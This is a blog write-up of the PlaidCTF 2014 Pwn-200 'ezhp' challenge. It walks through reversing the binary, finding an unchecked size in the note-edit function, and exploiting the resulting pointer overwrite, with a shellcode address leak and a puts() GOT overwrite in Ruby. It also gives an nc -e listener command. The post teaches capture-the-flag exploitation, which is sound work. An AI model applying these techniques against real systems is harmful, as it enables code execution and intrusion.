---
id: 1868
title: 'PlaidCTF writeup for Pwn-200 (a simple overflow bug)'
date: '2014-04-16T14:26:34-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1868'
permalink: /2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug
categories:
    - Hacking
    - 'PlaidCTF 2014'
    - 'Reverse Engineering'
---

I know what you're thinking of: what's with all the Web levels!?

Well, I was saving the exploitation levels for last! This post will be about Pwnable-200 (ezhp), and the next one will be Pwnable-275 (kappa). You can get the binary for ezhp <a href='https://blogdata.skullsecurity.org/ezhp'>here</a>, and I <em>highly</em> recommend poking at this if you're interested in exploitation&mdash;it's actually one of the easiest exploitation levels you'll find!
<!--more-->
Basically, ezhp was a simple note-writing system. When you run it, it looks like this:

<pre>
./ezhp
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
1
Please give me a size.
10
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
</pre>

In typical PPP fashion, it's a text-based app that is run using xinetd. I personally use "nc -vv -l -p 4444 -e ./ezhp" for testing, to make it run on localhost:4444.

<h2>The vulnerability</h2>

As usual, I started reversing from the easiest to the hardest. It's like a crossword puzzle, when you know the easy stuff, the hard stuff falls into place. My teammate insisted that we had to figure out the allocation code, but it was really confusing so I let him work on that. Meanwhile, I started looking at the change and print code.

Something I quickly notice is that the change option asks for a size:

<pre>
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
3
Please give me an id.
0
Please give me a size.
10
Please input your data.
aaaa
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
</pre>

But in the code, it doesn't re-allocate with the size:

<pre>
<span class="Statement">.text</span>:0<span class="Constant">80488E7</span>                 <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>], <span class="Identifier">offset</span> <span class="Identifier">aPleaseGiveMeAS</span> <span class="Comment">; &quot;Please give me a size.&quot;</span>
<span class="Statement">.text</span>:0<span class="Constant">80488EE</span>                 <span class="Identifier">call</span>    <span class="Identifier">_puts</span>
<span class="Statement">.text</span>:0<span class="Constant">80488EE</span>
<span class="Statement">.text</span>:0<span class="Constant">80488F3</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Identifier">ds</span>:<span class="Identifier">stdout</span>
<span class="Statement">.text</span>:0<span class="Constant">80488F8</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>], <span class="Identifier">eax</span>      <span class="Comment">; stream</span>
<span class="Statement">.text</span>:0<span class="Constant">80488FB</span>                 <span class="Identifier">call</span>    <span class="Identifier">_fflush</span>
<span class="Statement">.text</span>:0<span class="Constant">80488FB</span>
<span class="Statement">.text</span>:0<span class="Constant">8048900</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Identifier">offset</span> <span class="Identifier">aDC</span> <span class="Comment">; &quot;%d%*c&quot;</span>
<span class="Statement">.text</span>:0<span class="Constant">8048905</span>                 <span class="Identifier">lea</span>     <span class="Identifier">edx</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">entry_size</span>] <span class="Comment">; Nothing is stopping this from being negative</span>
<span class="Statement">.text</span>:0<span class="Constant">8048908</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">4</span>], <span class="Identifier">edx</span>
<span class="Statement">.text</span>:0<span class="Constant">804890C</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>], <span class="Identifier">eax</span>
<span class="Statement">.text</span>:0<span class="Constant">804890F</span>                 <span class="Identifier">call</span>    <span class="Identifier">___isoc99_scanf</span>
<span class="Statement">.text</span>:0<span class="Constant">804890F</span>
<span class="Statement">.text</span>:0<span class="Constant">8048914</span>                 <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>], <span class="Identifier">offset</span> <span class="Identifier">aPleaseInputYou</span> <span class="Comment">; &quot;Please input your data.&quot;</span>
<span class="Statement">.text</span>:0<span class="Constant">804891B</span>                 <span class="Identifier">call</span>    <span class="Identifier">_puts</span>
<span class="Statement">.text</span>:0<span class="Constant">804891B</span>
<span class="Statement">.text</span>:0<span class="Constant">8048920</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Identifier">ds</span>:<span class="Identifier">stdout</span>
<span class="Statement">.text</span>:0<span class="Constant">8048925</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>], <span class="Identifier">eax</span>      <span class="Comment">; stream</span>
<span class="Statement">.text</span>:0<span class="Constant">8048928</span>                 <span class="Identifier">call</span>    <span class="Identifier">_fflush</span>
<span class="Statement">.text</span>:0<span class="Constant">8048928</span>
<span class="Statement">.text</span>:0<span class="Constant">804892D</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">entry_size</span>]
<span class="Statement">.text</span>:0<span class="Constant">8048930</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">entry_id</span>]
<span class="Statement">.text</span>:0<span class="Constant">8048933</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Identifier">ds</span>:<span class="Identifier">entry_list</span>[<span class="Identifier">eax</span>*<span class="Constant">4</span>]
<span class="Statement">.text</span>:0<span class="Constant">804893A</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">8</span>], <span class="Identifier">edx</span>    <span class="Comment">; nbytes</span>
<span class="Statement">.text</span>:0<span class="Constant">804893E</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">4</span>], <span class="Identifier">eax</span>    <span class="Comment">; buf</span>
<span class="Statement">.text</span>:0<span class="Constant">8048942</span>                 <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>], <span class="Constant">0 </span><span class="Comment">; fd</span>
<span class="Statement">.text</span>:0<span class="Constant">8048949</span>                 <span class="Identifier">call</span>    <span class="Identifier">_read</span>
</pre>

Could it really be that easy? (Warning: this is going to be long, but I'll explain why I chose this series of actions right away)

<pre>
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
1
Please give me a size.
4
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
1
Please give me a size.
3
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
3
Please give me an id.
0
Please give me a size.
20
Please input your data.
AAAAAAAAAAAAAAAAAAAA
Please enter one of the following:
1 to add a note.
2 to remove a note.
3 to change a note.
4 to print a note.
5 to quit.
Please choose an option.
2
Please give me an id.
1
Segmentation fault (core dumped)
</pre>

Then using gdb to check out what happened:

<pre>
$ gdb -q ./ezhp ./core
Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="Comment">#0  0x0804874a in ?? ()</span>
(gdb) x/i <span class="Identifier">$eip</span>
<span class="Constant">0x804874a</span>:      mov    DWORD PTR [eax+<span class="Constant">0x8</span>],edx
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$eax</span>
$2 = <span class="Constant">0x41414141</span>
(gdb) x/5i <span class="Identifier">$eip</span>
<span class="Constant">0x804874a</span>:      mov    DWORD PTR [eax+<span class="Constant">0x8</span>],edx
<span class="Constant">0x804874d</span>:      mov    eax,ds:<span class="Constant">0x804b060</span>
<span class="Constant">0x8048752</span>:      mov    edx,DWORD PTR [eax+<span class="Constant">0x4</span>]
<span class="Constant">0x8048755</span>:      mov    eax,DWORD PTR [ebp-0xc]
<span class="Constant">0x8048758</span>:      mov    DWORD PTR [eax+<span class="Constant">0x4</span>],edx
</pre>

This is <em>exactly</em> what I expected to see. Let me explain.

<h2>Heap overflows</h2>

So, this isn't really a heap overflow. But it doesn't matter - it's a vulnerability that's effectively identical to a heap overflow, and involves a data structure that looks like this:

<pre>
<span class="Type">typedef</span> <span class="Type">struct</span> {
  <span class="Type">void</span> *previous;
  <span class="Type">void</span> *next;
  <span class="Type">char</span> data[<span class="Constant">0</span>]; <span class="Comment">/*</span><span class="Comment"> In C99+, this is an arbitrary-length array </span><span class="Comment">*/</span>
</pre>

For a much more details/in-depth version of this vulnerability, check out my writeup for <a href='/ghost-in-the-shellcode-gitsmsg-pwnage-299'>gitsmsg</a>.

What I did to test was:

<ul>
  <li>Allocate a small chunk of data</li>
  <li>Allocate a second small check of data, that most likely goes right after the first chunk</li>
  <li>Write too many 'AAAA...' values to the first chunk, so it overwrite's the second chunk's previous/next pointers</li>
  <li>Attempt to de-allocate the second chunk</li>
</ul>

When you attempt to de-allocate the second chunk, it's going to try to replace the previous/next pointers. It usually looks something like:

<pre>
this-&gt;prev-&gt;next = this-&gt;next;
this-&gt;next-&gt;prev = this-&gt;prev;
</pre>

Since this-&gt;prev and this-&gt;next are part of the data that was overwritten, they're going to be set to 'AAAA...'. So, we expect a crash when it tries to write to this-&gt;prev-&gt;next, since it's going to try to dereference this-&gt;prev, or 0x41414141. And sure enough, it crashes accessing 0x41414141:

<pre>
(gdb) x/i <span class="Identifier">$eip</span>
<span class="Constant">0x804874a</span>:      mov    DWORD PTR [eax+<span class="Constant">0x8</span>],edx
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$eax</span>
$2 = <span class="Constant">0x41414141</span>
</pre>

Note that it's writing to eax+0x8. We can surmise that eax+0x8 is either 'prev' or 'next'. Since this looks like unlinking code, we expect to see either eax+0x4 or eax+0xc written in the next couple lines. That's why when I saw this code:

<pre>
(gdb) x/5i <span class="Identifier">$eip</span>
<span class="Constant">0x804874a</span>:      mov    DWORD PTR [eax+<span class="Constant">0x8</span>],edx
<span class="Constant">0x804874d</span>:      mov    eax,ds:<span class="Constant">0x804b060</span>
<span class="Constant">0x8048752</span>:      mov    edx,DWORD PTR [eax+<span class="Constant">0x4</span>]
<span class="Constant">0x8048755</span>:      mov    eax,DWORD PTR [ebp-0xc]
<span class="Constant">0x8048758</span>:      mov    DWORD PTR [eax+<span class="Constant">0x4</span>],edx
</pre>

I knew exactly what I was looking at!

To summarize: they are allocating an array of data structures. Each structure comes after the previous, and contains previous/next pointers. By overwriting these pointers, we can cause an arbitrary address to be written with an arbitrary value. Sweet!

<h2>Exploit part 1: Leaking an address</h2>

This is the part where I always cross my fingers. Is executable memory being used? Or am I going to have to do something clever? Honestly, I didn't even figure out whether this was heap or .bss or whatever&mdash;I found this issue almost entirely by recognizing the exploit category. But I figured the easiest thing to do is just to try:

<ul>
  <li>Create a long block containing shellcode</li>
  <li>Create a short block</li>
  <li>Write the shellcode to the long block, and just enough padding to get right up to the short block's 'previous' pointer</li>
  <li>Print out the first block</li>
</ul>

Hopefully this isn't too confusing. What we want is to figure out where in memory shellcode is stored. I didn't actually check if the address is randomized, but it doesn't matter&mdash;when I have the opportunity to read the address of shellcode in a reliable way, I always take it. Why not make the code ASLR-proof if it's not much extra work?

The code looks like this in my exploit:

<pre>
<span class="Comment"># These are used to store shellcode and get the address</span>
reader = add_note(<span class="Type">SHELLCODE_SIZE</span> - <span class="Constant">16</span>)
read   = add_note(<span class="Constant">4</span>)

edit_note(reader, <span class="Type">SHELLCODE_SIZE</span>, <span class="Type">SHELLCODE</span> + (<span class="Special">&quot;</span><span class="Special">\xcc</span><span class="Special">&quot;</span> * (<span class="Type">SHELLCODE_SIZE</span> - SHELLCODE.length)))
result = print_note(reader, <span class="Type">SHELLCODE_SIZE</span> + <span class="Constant">8</span>).unpack(<span class="Special">&quot;</span><span class="Constant">I*</span><span class="Special">&quot;</span>)
<span class="Type">SHELLCODE_ADDRESS</span> = result[(<span class="Type">SHELLCODE_SIZE</span> / <span class="Constant">4</span>)] + <span class="Constant">0x0c</span>
</pre>

In the end, that address wound up being slightly inaccurate. I ended up dealing with that using a NOP sled (ewwww) instead of troubleshooting. Maybe I should have tried to understand the allocation code after all? :)

Now I have the address of my shellcode, what can I do with it!?

<h2>Exploit part 2: Controlling EIP</h2>

This is actually pretty easy once you understand part 1. Unlike gitsmsg (see the link above), RELRO wasn't enabled, which means I could edit the relocation table. The relocation table looks like:

<pre>
<span class="Statement">.got.plt</span>:0<span class="Constant">8049FF4</span> <span class="Identifier">_got_plt</span>        <span class="Identifier">segment</span> <span class="Identifier">dword</span> <span class="Identifier">public</span> '<span class="Identifier">DATA</span>' <span class="Identifier">use32</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">8049FF4</span>                 <span class="Identifier">assume</span> <span class="Identifier">cs</span>:<span class="Identifier">_got_plt</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">8049FF4</span>                 <span class="Comment">;org 8049FF4h</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">8049FF4</span>                 <span class="Identifier">align</span> <span class="Constant">10</span><span class="Identifier">h</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A000</span> <span class="Identifier">off_804A000</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">read</span>          <span class="Comment">; DATA XREF: _readr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A004</span> <span class="Identifier">off_804A004</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">fflush</span>        <span class="Comment">; DATA XREF: _fflushr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A008</span> <span class="Identifier">off_804A008</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">puts</span>          <span class="Comment">; DATA XREF: _putsr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A00C</span> <span class="Identifier">off_804A00C</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">__gmon_start__</span> <span class="Comment">; DATA XREF: ___gmon_start__r</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A010</span> <span class="Identifier">off_804A010</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">exit</span>          <span class="Comment">; DATA XREF: _exitr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A014</span> <span class="Identifier">off_804A014</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">__libc_start_main</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A014</span>                                         <span class="Comment">; DATA XREF: ___libc_start_mainr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A018</span> <span class="Identifier">off_804A018</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">__isoc99_scanf</span> <span class="Comment">; DATA XREF: ___isoc99_scanfr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A01C</span> <span class="Identifier">off_804A01C</span>     <span class="Identifier">dd</span> <span class="Identifier">offset</span> <span class="Identifier">sbrk</span>          <span class="Comment">; DATA XREF: _sbrkr</span>
<span class="Statement">.got.plt</span>:0<span class="Constant">804A01C</span> <span class="Identifier">_got_plt</span>        <span class="Identifier">ends</span>
</pre>

Ultimately, it doesn't matter which one I overwrite, as long as it gets called at some point. So, I chose puts(). The exploit code is pretty simple:

<pre>
<span class="Comment"># These are used to overwrite arbitrary memory</span>
writer = add_note(<span class="Constant">4</span>)
owned  = add_note(<span class="Constant">4</span>)

<span class="Comment"># Overwrite the second note's pointers, via the first</span>
edit_note(writer, <span class="Constant">24</span>, (<span class="Special">&quot;</span><span class="Constant">A</span><span class="Special">&quot;</span> * <span class="Constant">16</span>) + [<span class="Type">SHELLCODE_ADDRESS</span>, <span class="Type">PUTS_ADDRESS</span> - <span class="Constant">4</span>].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>))

<span class="Comment"># Removing it will trigger the overwrite</span>
remove_note(owned)
</pre>

Basically, we have 16 bytes of padding, then the address of the shellcode (the value we want to save) then the address of puts() in the relocation table (the place we want to save the shellcode address). Then we remove the note, which triggers the overwrite (and also a second overwrite, recall that unlinking changes both 'prev' and 'next'; it didn't affect me, but be careful with that). 

puts() immediately gets called, and the shellcode runs. I chose shellcode I found online, it's nothing special.

<a href='https://blogdata.skullsecurity.org/ezhp-sploit.rb'>Here's the full exploit</a>

<h2>Conclusion</h2>

On one hand, I'm proud that I found/exploited this level so quickly. I think I finished the whole thing in maybe 2 hours?

On the other hand, I never really understood why certain stuff worked and didn't work. For example, if my shellcode was too long it wouldn't work, and sometimes I couldn't read the address correctly. I also never really figured out the data structure, I completely used the debugger to get proper lengths.

So, it's kind of an ugly exploit. But it worked! Plus, we got 200 points for it, and in the end isn't that what matters?
